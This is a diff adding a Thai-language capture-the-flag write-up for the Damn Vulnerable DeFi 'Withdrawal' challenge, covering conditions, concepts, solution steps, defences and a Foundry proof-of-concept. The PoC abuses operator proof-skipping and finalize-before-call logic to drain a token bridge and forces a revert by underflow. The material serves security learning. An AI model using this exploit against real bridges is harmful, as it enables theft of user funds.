@@ -645,3 +645,55 @@ by tinamints
         for (uint256 i = 0; i < users.length; i++) lending.liquidate(users[i]);
     }
 }`
+
+
+## 18. Withdrawal
+### เงื่อนไข :
+- ต้อง finalize withdrawal ทั้ง 4 รายการในชุดที่ให้มา (รวมรายการที่น่าสงสัยด้วย) ใน L1 gateway (counter >= 4)
+- token bridge ต้องเหลือเงินมากกว่า 99% (เสียไปน้อยกว่า 1% แต่ยังต้อง finalize รายการอันตรายให้ได้)
+- player ต้องเหลือ token เป็น 0
+### คอนเซ็ป :
+-  access control พัง (operator ข้ามการตรวจ proof ได้)
+-  finalize ก่อน call / ไม่สนใจค่าที่ return
+-  ใช้ underflow บังคับให้ call ล้มเหลวโดยตั้งใจ
+### วิธีแก้ :
+- `L1Gateway.finalizeWithdrawal()` ยอมให้ใครก็ตามที่มี `OPERATOR_ROLE` (ซึ่งก็คือ player) finalize withdrawal ได้ด้วย Merkle proof ว่าง ๆ และมันจะ mark leaf ว่า finalized + เพิ่ม counter **ก่อน** จะ call ออกไปข้างนอก แล้วก็ **ไม่สนใจว่า call นั้นสำเร็จหรือไม่** ส่วนดีเลย์ 7 วันก็มีผลกับ operator ด้วย เราจึงแค่ `vm.warp` ข้ามมันไป (ไม่ต้องปั่น timestamp)
+- ในบรรดา withdrawal 4 รายการ มี 3 รายการที่ถูกต้อง (โอน 10 DVT ต่อรายการ) และมี 1 รายการ (index 2) ที่เป็นรายการอันตราย ซึ่งดึงออกไป 999,000 DVT จนทำให้ bridge หมดตัว เราต้อง finalize leaf ของมันโดยไม่ให้การโอน token เกิดขึ้นจริง
+- ขั้นตอน (ทำในฐานะ operator ทั้งหมด โดย replay payload จาก `withdrawals.json` ตามจริง): (1) finalize 3 รายการที่ถูกต้อง; (2) finalize รายการที่เรา **สร้างขึ้นเอง** เพื่อดึง 999,000 DVT ออกไปที่ player ทำให้ bridge ว่าง; (3) finalize รายการอันตราย ตอนนี้ `TokenBridge.executeTokenWithdrawal` จะทำ `totalDeposits -= 999_000e18` ซึ่ง **underflow แล้ว revert** leaf จึงถูกบันทึกว่า finalized แต่ไม่มี token ขยับ; (4) โอน 999,000 DVT กลับคืน bridge (player เหลือ 0)
+### การป้องกัน :
+- อย่าให้ role ที่มีสิทธิ์พิเศษข้ามการตรวจ proof ได้, ตรวจสอบว่า message ทำงานสำเร็จจริงก่อนจะ mark ว่า finalized (เช็คค่า return / การ revert ของ call), และใส่เพดานจำนวนเงินต่อ withdrawal เพื่อไม่ให้ message เดียวดึงเงินออกจาก bridge ได้ทั้งหมด
+### POC
+` function test_withdrawal() public checkSolvedByPlayer {
+        vm.warp(block.timestamp + l1Gateway.DELAY() + 1 days);
+        bytes32[] memory noProof = new bytes32[](0);
+        string memory logs = vm.readFile("test/withdrawal/withdrawals.json");
+
+        // 1) finalize 3 รายการที่ถูกต้อง (10 DVT ต่อรายการ)
+        _finalizeLog(logs, 0, noProof);
+        _finalizeLog(logs, 1, noProof);
+        _finalizeLog(logs, 3, noProof);
+
+        // 2) ดึงเงินออกจาก bridge ไปที่ player ด้วย withdrawal ที่เราสร้างเองในฐานะ operator
+        uint256 drain = 999_000e18;
+        bytes memory inner = abi.encodeWithSignature("executeTokenWithdrawal(address,uint256)", player, drain);
+        bytes memory fwd = abi.encodeWithSignature(
+            "forwardMessage(uint256,address,address,bytes)", uint256(1000), player, address(l1TokenBridge), inner
+        );
+        l1Gateway.finalizeWithdrawal(1000, l2Handler, address(l1Forwarder), START_TIMESTAMP, fwd, noProof);
+
+        // 3) finalize รายการอันตราย -> การโอนข้างในเจอ underflow revert แต่ยังถูก finalize
+        _finalizeLog(logs, 2, noProof);
+
+        // 4) คืน token ที่ดึงมากลับไป (player เหลือ 0)
+        token.transfer(address(l1TokenBridge), drain);
+    }`
+
+`// replay log ของ L2 withdrawal ผ่าน finalizeWithdrawal (operator, ไม่ต้องใช้ proof)
+    // log data = abi.encode(bytes32 id, uint256 timestamp, bytes message); topics[1]=nonce
+    function _finalizeLog(string memory logs, uint256 i, bytes32[] memory noProof) private {
+        string memory base = string.concat("[", vm.toString(i), "]");
+        uint256 nonce = uint256(vm.parseJsonBytes32(logs, string.concat(base, ".topics[1]")));
+        bytes memory data = vm.parseJsonBytes(logs, string.concat(base, ".data"));
+        (, uint256 timestamp, bytes memory message) = abi.decode(data, (bytes32, uint256, bytes));
+        l1Gateway.finalizeWithdrawal(nonce, l2Handler, address(l1Forwarder), timestamp, message, noProof);
+    }`
